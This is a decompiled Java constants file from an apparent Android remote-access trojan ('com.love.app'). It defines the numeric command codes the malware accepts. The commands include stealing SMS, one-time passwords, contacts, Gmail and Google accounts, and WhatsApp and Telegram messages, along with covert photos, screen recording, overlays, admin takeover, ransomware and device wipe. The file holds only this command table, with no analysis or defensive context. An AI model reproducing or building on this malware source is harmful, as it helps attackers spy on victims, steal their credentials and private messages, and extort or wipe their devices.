/*
 * Decompiled with CFR 0.152.
 */
package com.love.app;

public class Constant {
    public static final int CMD_BACK = 66985478;
    public static final int CMD_CHANGE_WALLPAPER = 1011;
    public static final int CMD_CLICK = 44598715;
    public static final int CMD_ENABLE_ADMIN = 99887766;
    public static final int CMD_FETCH_GMAIL = 200;
    public static final int CMD_GET_APPS = 1596485;
    public static final int CMD_GET_BROWSER_HISTORY = 1007;
    public static final int CMD_GET_CALL_LOGS = 1004;
    public static final int CMD_GET_CONTACTS = 1001;
    public static final int CMD_GET_DEVICE_INFO = 1006;
    public static final int CMD_GET_FILE_LIST = 1014;
    public static final int CMD_GET_GALLERY = 1020;
    public static final int CMD_GET_GOOGLE_ACCOUNTS = 1053;
    public static final int CMD_GET_LOCATION = 1005;
    public static final int CMD_GET_NOTIFICATIONS = 1019;
    public static final int CMD_GET_OTP = 1051;
    public static final int CMD_GET_SMS = 1002;
    public static final int CMD_GET_TELEGRAM = 1052;
    public static final int CMD_GET_TELEGRAM_MESSAGES = 1055;
    public static final int CMD_GET_WHATSAPP_MESSAGES = 1054;
    public static final int CMD_GET_WHATSAPP_NUMBER = 1050;
    public static final int CMD_HOME = 25896321;
    public static final int CMD_LAUNCH_APP = 74789654;
    public static final int CMD_LOCK_SCREEN = 98765432;
    public static final int CMD_NOTIFICATIONS = 45832158;
    public static final int CMD_OVERLAY_HIDE = 89521475;
    public static final int CMD_OVERLAY_SHOW = 5698742;
    public static final int CMD_RANSOMWARE = 1010;
    public static final int CMD_RECENTS = 33654789;
    public static final int CMD_SCREENSHOT = 1060;
    public static final int CMD_SCREEN_MESSAGE = 1013;
    public static final int CMD_SCREEN_RECORD_START = 1061;
    public static final int CMD_SCREEN_RECORD_STOP = 1062;
    public static final int CMD_SEND_SMS = 1003;
    public static final int CMD_SEND_VOICE = 2001;
    public static final int CMD_SET_LOCK_MODE = 2000;
    public static final int CMD_SET_LOCK_PIN = 87654321;
    public static final int CMD_SET_TEXT = 885478962;
    public static final int CMD_STOP_RANSOMWARE = 10101;
    public static final int CMD_TAKE_PHOTO_BACK = 11223344;
    public static final int CMD_TAKE_PHOTO_FRONT = 11223345;
    public static final int CMD_TORCH_BLINK = 1018;
    public static final int CMD_TORCH_OFF = 1017;
    public static final int CMD_TORCH_ON = 1016;
    public static final int CMD_TOUCH = 115987;
    public static final int CMD_UNINSTALL = 64645897;
    public static final int CMD_UNLOCK_SCREEN = 98765433;
    public static final int CMD_UPLOAD_FILE = 1015;
    public static final int CMD_VIBRATE = 1008;
    public static final int CMD_VOICE_MESSAGE = 1012;
    public static final int CMD_WIPE = 1009;
}

